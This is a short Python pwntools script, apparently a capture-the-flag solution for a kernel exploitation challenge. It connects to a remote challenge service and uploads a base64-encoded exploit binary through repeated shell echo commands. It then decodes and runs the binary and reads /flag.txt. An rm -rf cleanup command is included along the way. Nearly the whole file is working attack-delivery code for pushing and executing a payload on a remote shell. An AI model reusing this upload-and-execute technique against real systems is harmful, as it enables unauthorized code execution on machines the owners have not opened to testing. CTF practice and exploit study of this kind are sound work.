from base64 import b64encode
from os import popen
from pwn import *

# popen("gcc exp.c -masm=intel -static -o initramfs/exploit")
# popen("strip -S initramfs/exploit")
b64payload = popen("base64 < ./exploit.gz").read()
b64payload = b64payload.split("\n")
total = len(b64payload)
pause()
# io = remote("206.189.23.108",31429)

io = remote("0.cloud.chals.io", 13897)

io.sendlineafter(b"$ ", b"export PS1='$ '")

io.sendlineafter(
    b"$ ", b"rm -rf /home/noob/b64payload ; touch /home/noob/b64payload ; cd /home/noob")
i = 0
for line in b64payload:
    assert ("\n" not in line)
    io.sendlineafter(
        b"$ ", f"echo \"{line}\" >> /home/noob/b64payload".encode())

    print(f"Upload: {(i+1)/total*100}%")
    i += 1

io.sendlineafter(
    b"$ ", b"base64 -d < /home/noob/b64payload > /home/noob/exp.gz")


io.sendlineafter(
    b"$ ", b"gunzip exp.gz ; chmod +x exp ; ./exp ; cat /flag.txt")


io.interactive()
